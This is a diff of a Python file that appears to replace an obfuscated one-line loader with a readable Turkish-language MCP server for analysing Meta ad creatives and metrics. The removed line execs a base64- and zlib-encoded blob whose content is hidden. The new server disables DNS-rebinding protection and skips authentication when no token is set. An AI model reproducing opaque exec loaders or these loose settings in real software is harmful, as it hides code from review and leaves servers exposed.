@@ -1,2 +1,273 @@
-import base64,zlib
-exec(compile(zlib.decompress(base64.b64decode("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")).decode(),"app","exec"))
+"""
+Creative Performance MCP
+========================
+Meta (Facebook & Instagram) reklam KREATIFLERININ (gorsel/banner) performansini
+yorumlar ve GORSELIN KENDISI uzerinden CRO odakli, uygulanabilir iyilestirme
+onerileri verir. SADECE kreatif konusur; butce/hedefleme/teklif gibi konulara girmez.
+
+Gorsel analizi API kullanmaz: banner'in kendisi arac sonucunda GORSEL olarak
+dondurulur; musterinin kendi modeli (Claude/ChatGPT) gorseli gorup yorumlar.
+Boylece operatore ek maliyet cikmaz.
+
+Hem Claude hem ChatGPT'ye remote MCP olarak baglanir.  Uc nokta: /mcp
+"""
+
+import os
+import httpx
+from mcp.server.fastmcp import FastMCP, Image
+from mcp.server.transport_security import TransportSecuritySettings
+from starlette.middleware.base import BaseHTTPMiddleware
+from starlette.responses import JSONResponse
+
+# ----------------------------------------------------------------- config
+TOKEN = os.getenv("META_ACCESS_TOKEN", "")
+ACCT = os.getenv("META_AD_ACCOUNT_ID", "")
+VER = os.getenv("META_API_VERSION", "v21.0")
+CONN = os.getenv("CONNECTOR_TOKEN", "")
+DEMO = not (TOKEN and ACCT)
+GRAPH = "https://graph.facebook.com"
+HERE = os.path.dirname(os.path.abspath(__file__))
+
+INSTRUCTIONS = (
+    "Sen bir REKLAM KREATIFI (gorsel/banner) PERFORMANS ve CRO ANALISTISIN. "
+    "Yalnizca Meta (Facebook & Instagram) reklam kreatiflerini degerlendirir, "
+    "GORSELIN KENDISINI inceleyip donusum (CRO) odakli, uygulanabilir iyilestirme "
+    "onerileri verirsin. Metrikleri (CTR, thumbstop, hold, CVR, CPA, ROAS, frequency) "
+    "gorsel bulgularla birlestir; her oneriyi bir metrige veya net bir CRO gerekcesine "
+    "bagla. KAPSAM DISI konular (butce, teklif/bidding, kampanya yapisi, hedefleme/"
+    "audience, yerlesim optimizasyonu, pixel/teknik kurulum, hesap yonetimi) sorulursa "
+    "kibarca 'bu konu kapsamim disinda' de ve konuyu kreatiflere geri getir."
+)
+
+# CRO degerlendirme cercevesi -- her analiz ciktisina eklenir, modeli yonlendirir.
+CRO_RUBRIC = (
+    "[GOREV] Ekteki banner GORSELINI ve yukaridaki metrikleri birlikte degerlendir. "
+    "Su adimlarla, kisa ve aksiyon odakli yaz:\n"
+    "1) HOOK & ILK IZLENIM: Ilk 1 saniyede dikkat ceken ne? Mesaj/urun net mi?\n"
+    "2) GORSEL HIYERARSI: Goz sirasi dogru mu (once vaat, sonra urun, sonra CTA)? "
+    "Kontrast, metin yogunlugu, okunabilirlik, marka gorunurlugu, mobilde durum.\n"
+    "3) CTA & DONUSUM (CRO): CTA belirgin mi, tiklamaya davet ediyor mu? Gorseldeki "
+    "vaat ile olasi landing/teklif uyumlu mu? Donusumu dusuren gorsel surtunmeler ne?\n"
+    "4) METRIK BAGLANTISI: Gozlemleri metrige bagla -- dusuk thumbstop->hook zayif; "
+    "yuksek CTR+dusuk CVR->gorsel vaat ile landing uyumsuz; yuksek frequency+dusen "
+    "CTR->kreatif yorgunlugu, yenile.\n"
+    "5) EN IYI KULLANIM SENARYOSU: Bu kreatif hangi huni asamasina (farkindalik/"
+    "degerlendirme/donusum) ve hangi yerlesime (Feed / Reels / Stories; statik/video) "
+    "en uygun? Nerede israf olur?\n"
+    "6) ONCELIKLI ONERILER: 3-5 maddede 'sunu soyle degistir' biciminde somut, test "
+    "edilebilir iyilestirme (A/B onerisi dahil). SADECE kreatif/gorsel; butce/hedefleme yok."
+)
+
+mcp = FastMCP(
+    name="creative-performance-mcp",
+    instructions=INSTRUCTIONS,
+    transport_security=TransportSecuritySettings(enable_dns_rebinding_protection=False),
+)
+
+# ----------------------------------------------------------------- demo data
+DEMO_ROWS = [
+    {"ad_id": "1202", "ad_name": "Yaz Indirimi - Statik Banner A", "impressions": 210500,
+     "spend": 5620.0, "link_ctr_pct": 1.95, "ctr_all_pct": 2.19, "cpc": 1.37, "cpm": 26.7,
+     "frequency": 2.1, "conversions": 190, "cvr_pct": 4.63, "cpa": 29.58, "roas": 3.4,
+     "thumbstop_pct": None, "hold_rate_pct": None},
+    {"ad_id": "1203", "ad_name": "Marka Bilinirlik - Karusel C", "impressions": 98000,
+     "spend": 2100.0, "link_ctr_pct": 0.62, "ctr_all_pct": 0.80, "cpc": 3.44, "cpm": 21.4,
+     "frequency": 5.6, "conversions": 12, "cvr_pct": 1.97, "cpa": 175.0, "roas": 0.75,
+     "thumbstop_pct": None, "hold_rate_pct": None},
+]
+
+
+def _demo_image():
+    """Demo modunda paketlenmis ornek banner'i (byte) dondurur; yoksa None."""
+    p = os.path.join(HERE, "sample_banner.jpg")
+    try:
+        with open(p, "rb") as f:
+            return f.read(), "jpeg"
+    except Exception:
+        return None
+
+
+# ----------------------------------------------------------------- meta client
+FIELDS = ("ad_id,ad_name,impressions,inline_link_clicks,ctr,inline_link_click_ctr,"
+          "cpc,cpm,spend,frequency,actions,action_values,video_play_actions,"
+          "video_p100_watched_actions")
+
+
+def _graph(path, params):
+    params = {**params, "access_token": TOKEN}
+    r = httpx.get(f"{GRAPH}/{VER}/{path}", params=params, timeout=60)
+    if r.status_code >= 400:
+        raise RuntimeError(f"Meta API {r.status_code}: {r.text[:300]}")
+    return r.json()
+
+
+def _num(x):
+    try:
+        return float(x)
+    except (TypeError, ValueError):
+        return 0.0
+
+
+def _normalize(row):
+    imp = _num(row.get("impressions"))
+    lc = _num(row.get("inline_link_clicks"))
+    sp = _num(row.get("spend"))
+    conv = rev = 0.0
+    for a in row.get("actions", []) or []:
+        if "purchase" in a.get("action_type", ""):
+            conv += _num(a.get("value"))
+    for a in row.get("action_values", []) or []:
+        if "purchase" in a.get("action_type", ""):
+            rev += _num(a.get("value"))
+
+    def fv(k):
+        arr = row.get(k) or []
+        return _num(arr[0].get("value")) if arr else 0.0
+
+    plays, p100 = fv("video_play_actions"), fv("video_p100_watched_actions")
+    return {
+        "ad_id": row.get("ad_id"), "ad_name": row.get("ad_name"),
+        "impressions": int(imp), "spend": round(sp, 2),
+        "link_ctr_pct": round(_num(row.get("inline_link_click_ctr")), 3) or None,
+        "ctr_all_pct": round(_num(row.get("ctr")), 3) or None,
+        "cpc": round(_num(row.get("cpc")), 2) or None,
+        "cpm": round(_num(row.get("cpm")), 2) or None,
+        "frequency": round(_num(row.get("frequency")), 2) or None,
+        "conversions": int(conv),
+        "cvr_pct": round(conv / lc * 100, 2) if lc else None,
+        "cpa": round(sp / conv, 2) if conv else None,
+        "roas": round(rev / sp, 2) if sp else None,
+        "thumbstop_pct": round(plays / imp * 100, 2) if imp else None,
+        "hold_rate_pct": round(p100 / plays * 100, 2) if plays else None,
+    }
+
+
+def get_insights(date_preset="last_14d", ad_id=None):
+    if DEMO:
+        if ad_id:
+            return [r for r in DEMO_ROWS if r["ad_id"] == ad_id] or [DEMO_ROWS[0]]
+        return list(DEMO_ROWS)
+    acct = ACCT if ACCT.startswith("act_") else "act_" + ACCT
+    path = f"{ad_id}/insights" if ad_id else f"{acct}/insights"
+    data = _graph(path, {"level": "ad", "fields": FIELDS,
+                         "date_preset": date_preset, "limit": 200})
+    return [_normalize(r) for r in data.get("data", [])]
+
+
+def get_image(ad_id):
+    """(bytes, format) dondurur; yoksa None. Gorsel araca eklenip modele gonderilir."""
+    if DEMO:
+        return _demo_image()
+    data = _graph(ad_id, {"fields": "creative{image_url,thumbnail_url,asset_feed_spec{images}}"})
+    cr = data.get("creative", {}) or {}
+    url = cr.get("image_url")
+    if not url:
+        imgs = (cr.get("asset_feed_spec", {}) or {}).get("images") or []
+        if imgs:
+            url = imgs[0].get("url")
+    url = url or cr.get("thumbnail_url")
+    if not url:
+        return None
+    try:
+        r = httpx.get(url, timeout=45, follow_redirects=True)
+        r.raise_for_status()
+        ct = r.headers.get("content-type", "image/jpeg").split(";")[0]
+        fmt = {"image/jpeg": "jpeg", "image/png": "png", "image/gif": "gif",
+               "image/webp": "webp"}.get(ct, "jpeg")
+        return r.content, fmt
+    except Exception:
+        return None
+
+
+# ----------------------------------------------------------------- format
+def fmt(m):
+    def g(k, s=""):
+        v = m.get(k)
+        return f"{v}{s}" if v is not None else "-"
+    return (f"- {m.get('ad_name') or m.get('ad_id')} (id:{m.get('ad_id')})\n"
+            f"  Gosterim:{g('impressions')} Harcama:{g('spend')} | CTR(link):{g('link_ctr_pct','%')} "
+            f"CTR:{g('ctr_all_pct','%')} CPC:{g('cpc')} CPM:{g('cpm')}\n"
+            f"  Thumbstop:{g('thumbstop_pct','%')} Hold:{g('hold_rate_pct','%')} Freq:{g('frequency')} | "
+            f"Donusum:{g('conversions')} CVR:{g('cvr_pct','%')} CPA:{g('cpa')} ROAS:{g('roas','x')}")
+
+
+# ----------------------------------------------------------------- tools
+@mcp.tool()
+def list_creatives(date_preset: str = "last_14d"):
+    """Meta reklam hesabindaki kreatifleri (banner) metrikleriyle listeler, link CTR'a
+    gore siralar. Kullanici hangi gorseli inceleyecegine karar vermeden once bunu cagir."""
+    try:
+        rows = get_insights(date_preset)
+    except Exception as e:
+        return f"HATA: {e}"
+    if not rows:
+        return "Bu tarih araliginda kreatif verisi yok."
+    rows = sorted(rows, key=lambda r: (r.get("link_ctr_pct") or 0), reverse=True)
+    tag = " [DEMO]" if DEMO else ""
+    return f"{len(rows)} kreatif{tag} ({date_preset}), link CTR'a gore sirali:\n\n" + \
+        "\n\n".join(fmt(r) for r in rows)
+
+
+@mcp.tool()
+def analyze_creative(ad_id: str, date_preset: str = "last_14d"):
+    """Tek kreatifi derin analiz eder: metrikleri ceker VE banner'in kendisini GORSEL
+    olarak arac sonucuna ekler; sen (Claude/ChatGPT) gorseli gorup CRO odakli, uygulanabilir
+    oneriler verirsin. ad_id: list_creatives'teki reklam id'si."""
+    try:
+        ins = get_insights(date_preset, ad_id)
+        img = get_image(ad_id)
+    except Exception as e:
+        return f"HATA: {e}"
+    m = ins[0] if ins else {"ad_id": ad_id}
+    parts = ["=== METRIKLER ===\n" + fmt(m)]
+    if img:
+        parts.append("\n=== BANNER GORSELI (asagida) — bu gorseli incele ===")
+        parts.append(Image(data=img[0], format=img[1]))
+    else:
+        note = "" if DEMO else " (gercek gorsel bulunamadi.)"
+        parts.append("\n(Bu kreatif icin gorsel eklenemedi." + note + ")")
+    parts.append("\n" + CRO_RUBRIC)
+    return parts
+
+
+@mcp.tool()
+def compare_creatives(ad_ids: list, date_preset: str = "last_14d"):
+    """2-5 kreatifi yan yana karsilastirir: her birinin metriklerini ve GORSELINI arac
+    sonucuna ekler; sen kazanani secip hem metriksel hem gorsel/CRO nedenlerini aciklar,
+    zayif olana somut iyilestirme onerirsin. ad_ids: reklam id listesi (en fazla 5)."""
+    ad_ids = ad_ids[:5]
+    if len(ad_ids) < 2:
+        return "Karsilastirma icin en az 2 reklam id'si gerekir."
+    parts = [f"{len(ad_ids)} kreatif karsilastirmasi ({date_preset}):"]
+    for aid in ad_ids:
+        try:
+            ins = get_insights(date_preset, aid)
+            img = get_image(aid)
+        except Exception as e:
+            parts.append(f"\n[{aid}] HATA: {e}")
+            continue
+        m = ins[0] if ins else {"ad_id": aid}
+        parts.append("\n----------------------------------------\n" + fmt(m))
+        if img:
+            parts.append(Image(data=img[0], format=img[1]))
+    parts.append("\n" + CRO_RUBRIC +
+                 "\n\nSON OLARAK: kazanan kreatifi sec; metriksel + gorsel/CRO nedenlerini "
+                 "ozetle ve zayif kreatif icin en yuksek etkili 2-3 iyilestirmeyi belirt.")
+    return parts
+
+
+# ----------------------------------------------------------------- app
+class BearerAuth(BaseHTTPMiddleware):
+    async def dispatch(self, request, call_next):
+        if CONN and request.headers.get("authorization", "") != f"Bearer {CONN}":
+            return JSONResponse({"error": "unauthorized"}, status_code=401)
+        return await call_next(request)
+
+
+app = mcp.streamable_http_app()
+app.add_middleware(BearerAuth)
+
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "8080")))
